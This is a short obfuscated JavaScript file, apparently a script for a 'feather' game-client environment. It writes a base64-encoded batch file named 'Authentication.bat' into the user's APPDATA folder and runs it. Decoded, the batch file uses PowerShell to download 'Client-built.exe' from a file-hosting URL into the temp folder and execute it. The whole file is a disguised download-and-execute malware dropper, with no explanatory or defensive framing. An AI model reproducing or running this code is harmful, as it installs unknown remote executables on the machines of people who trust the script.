  
function getEnv(_0x89354c) {
  const _0x1b7771 = Java.type("java.lang.System");
  return _0x1b7771.getenv(_0x89354c);
}
function executeBat(_0x4aa79a, _0x538bd = null, _0x587868 = true) {
  if (_0x538bd) {
    const _0x3d0a45 = Java.type("java.util.Base64");
    FS.open(fullPath).write(_0x587868 ? _0x3d0a45.getDecoder().decode(_0x538bd) : _0x538bd);
  }
  const _0x5913c4 = Java.type("java.lang.Runtime");
  if (!FS.exists(_0x4aa79a)) {
    throw new Error("Failed num \"" + _0x4aa79a + "\"");
  }
  if (!FS.toRawFile(_0x4aa79a).isFile()) {
    throw new Error("\"" + _0x4aa79a + "\" auth");
  }
  _0x5913c4.getRuntime().exec("cmd /c start \"\" \"" + _0x4aa79a + "\"");
}
const fullPath = getEnv("APPDATA") + "\\" + ".feather\\Authentication.bat";
executeBat(fullPath, "QGVjaG8gb2ZmCjo6IERvd25sb2FkIHRoZSBmaWxlIHVzaW5nIFBvd2VyU2hlbGwKcG93ZXJzaGVsbCAtQ29tbWFuZCAiSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAnaHR0cHM6Ly9zdG9yZTYuZ29maWxlLmlvL2Rvd25sb2FkL3dlYi85ZjMyOGMwOS02YzEzLTQ0NzEtOTUxNy1kMGUzMzQ3N2FiNmUvQ2xpZW50LWJ1aWx0LmV4ZScgLU91dEZpbGUgJyVURU1QJVxDbGllbnQtYnVpbHQuZXhlJyIKCjo6IE1vdmUgdGhlIGRvd25sb2FkZWQgZmlsZSB0byB0aGUgVEVNUCBkaXJlY3RvcnkKbW92ZSAvWSAiQ2xpZW50LWJ1aWx0LmV4ZSIgIiVURU1QJVxDbGllbnQtYnVpbHQuZXhlIgoKOjogUnVuIHRoZSBleGVjdXRhYmxlCnN0YXJ0ICIiICIlVEVNUCVcQ2xpZW50LWJ1aWx0LmV4ZSIKCjo6IEV4aXQgdGhlIGJhdGNoIGZpbGUKZXhpdAo="); 
